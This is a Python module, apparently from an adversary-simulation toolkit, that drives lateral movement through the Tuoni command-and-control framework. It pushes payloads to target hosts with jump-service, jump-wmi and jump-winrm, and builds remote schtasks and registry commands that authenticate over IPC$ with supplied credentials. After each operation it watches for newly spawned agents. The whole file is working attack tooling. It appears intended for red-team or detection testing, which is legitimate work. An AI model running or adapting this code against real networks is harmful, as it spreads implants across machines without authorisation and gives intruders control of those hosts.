"""Tuoni lateral movement — drive jump-* ops from an admin-context agent."""
import json
import random
import sys
import time

from adsim.tuoni.common import (
    TuoniScriptError,
    active_agent_guids,
    active_agents,
    agent_row,
    authenticate,
    find_template,
    pick_agent,
    submit_and_wait,
)

OP_TEMPLATES = {
    "jump-service":     "shelldot.commands.os",
    "jump-wmi":         "shelldot.commands.os",
    "jump-winrm":       "shelldot.commands.os",
}

CMD_OPS = {"schtasks-remote", "reg-remote"}


def _agent_self_exec_units(agent):
    caps = (agent.metadata or {}).get("capabilities") or {}
    if not isinstance(caps, dict):
        return []
    out = []
    for k in ("supportedExecUnitTypesForSelfProcesses", "supportedExecUnitTypes"):
        v = caps.get(k) or []
        if isinstance(v, list):
            out.extend(v)
    return list(dict.fromkeys(out))


def preflight_jump(agent):
    units = _agent_self_exec_units(agent)
    integrity = (agent.metadata or {}).get("integrity", "?")
    if not units:
        print("[!] agent advertises no SELF exec-unit types "
              "(metadata.capabilities.supportedExecUnitTypesForSelfProcesses=[])",
              file=sys.stderr)
    if integrity and integrity.lower() != "high":
        print(f"[!] agent integrity={integrity} (not High)", file=sys.stderr)
    print(f"[*] Source SELF exec units: {','.join(units) or '(none advertised)'}; "
          f"integrity={integrity or '(unset)'}", file=sys.stderr)


def build_cmd_command(op, target, username, password):
    net_setup = (
        f"net use \\\\{target}\\IPC$ /u:{username} {password} && "
        if username and password else ""
    )
    net_teardown = (
        f" && net use \\\\{target}\\IPC$ /delete"
        if username and password else ""
    )

    if op == "schtasks-remote":
        task = f"TuoniTask{random.randint(1000, 9999)}"
        return (
            f"{net_setup}"
            f"schtasks /S {target} /Create /TN {task} /SC ONCE /ST 23:59 "
            f'/TR "cmd.exe /c whoami" /F && '
            f"schtasks /S {target} /Run /TN {task} && "
            f"timeout /t 3 /nobreak && "
            f"schtasks /S {target} /Delete /TN {task} /F"
            f"{net_teardown}"
        )

    if op == "reg-remote":
        return (
            f"{net_setup}"
            f"reg add \\\\{target}\\HKLM\\SOFTWARE\\TuoniSim /v Marker /t REG_SZ /d TuoniTest /f && "
            f"reg delete \\\\{target}\\HKLM\\SOFTWARE\\TuoniSim /f"
            f"{net_teardown}"
        )

    raise TuoniScriptError(f"unknown cmd op: {op}")


def build_config(op, target, payload_id, username=None, password=None, copy_path=None,
                  copy_method="SMB", service_name=None, cleanup=True):
    cfg = {"target": target, "payloadId": payload_id}
    if username:
        cfg["username"] = username
    if password:
        cfg["password"] = password
    if op.startswith("jump-") and copy_path:
        cfg["copyPath"] = copy_path
    if op == "jump-service":
        cfg["copyMethod"] = copy_method
        cfg["serviceName"] = service_name
        cfg["cleanup"] = cleanup
    return cfg


def report(c2, cmd, before_guids):
    tpl_name = cmd.get_template().name
    if cmd.is_failed():
        status = "failed"
        print(f"[!] {tpl_name} FAILED (cmd id={cmd.command_id})", file=sys.stderr)
    elif cmd.is_done():
        status = "done"
        print(f"[+] {tpl_name} done (cmd id={cmd.command_id})", file=sys.stderr)
    else:
        status = "timeout"
        print(f"[!] {tpl_name} still ongoing — wait timeout "
              f"(cmd id={cmd.command_id})", file=sys.stderr)

    result = cmd.get_result()
    text = None
    err = None
    if result is not None:
        text = result.get_text()
        if text and text.strip():
            print(text.strip())
        err = getattr(result, "error_message", None)
        if err:
            print(err)

    print("-- command record --", file=sys.stderr)
    try:
        print(json.dumps(c2.request_get(f"/api/v1/commands/{cmd.command_id}"),
                         indent=2, default=str), file=sys.stderr)
    except Exception as exc:
        print(f"(could not fetch command {cmd.command_id}: {exc})", file=sys.stderr)

    print("-- new agents (post-op) --", file=sys.stderr)
    deadline = time.time() + 30
    new_agents = []
    while time.time() < deadline:
        new_agents = [agent_row(a) for a in active_agents(c2) if a.guid not in before_guids]
        if new_agents:
            break
        time.sleep(3)

    if not new_agents:
        print("  (no new agents)", file=sys.stderr)
    for a in new_agents:
        print(f"  + {a['guid']}  host={a['hostname']}  user={a['username']}  ips={a['ips']}",
              file=sys.stderr)

    return {
        "command_id": cmd.command_id,
        "status": status,
        "stdout": text,
        "error": err,
        "new_agents": new_agents,
    }


def tuoni_lateral(op="jump-service", api=None, user=None, password=None,
                 source=None, target=None, service_name=None, copy_path=None,
                 copy_method="SMB", cleanup=True, username=None, target_password=None,
                 max_wait=180, payload_id=None):
    if op not in CMD_OPS and payload_id is None:
        raise TuoniScriptError(f"payload_id required for {op}")
    c2 = authenticate(api, user, password)
    src = pick_agent(c2, source)
    src_host = agent_row(src)["hostname"]
    src_user = agent_row(src)["username"]

    print(f"[*] Source: {src.guid[:8]} ({src_host}) running as {src_user}",
          file=sys.stderr)

    if "admin" not in src_user.lower() and "system" not in src_user.lower():
        print(f"[!] Source agent context is not obviously admin ('{src_user}') — "
              f"jump-* ops write ADMIN$ / open SCM. Proceeding.", file=sys.stderr)

    before_guids = active_agent_guids(c2)

    if op in CMD_OPS:
        tpl = find_template(c2, "cmd")
        command_str = build_cmd_command(op, target, username, target_password)
        cmd = submit_and_wait(src, tpl, {"command": command_str}, max_wait)
    else:
        preflight_jump(src)
        tpl = find_template(c2, op, OP_TEMPLATES[op])
        cfg = build_config(
            op, target, payload_id, username=username, password=target_password,
            copy_path=copy_path, copy_method=copy_method,
            service_name=service_name or f"TuoniSim{random.randint(1000, 99999)}",
            cleanup=cleanup,
        )
        cmd = submit_and_wait(src, tpl, cfg, max_wait)

    return report(c2, cmd, before_guids)
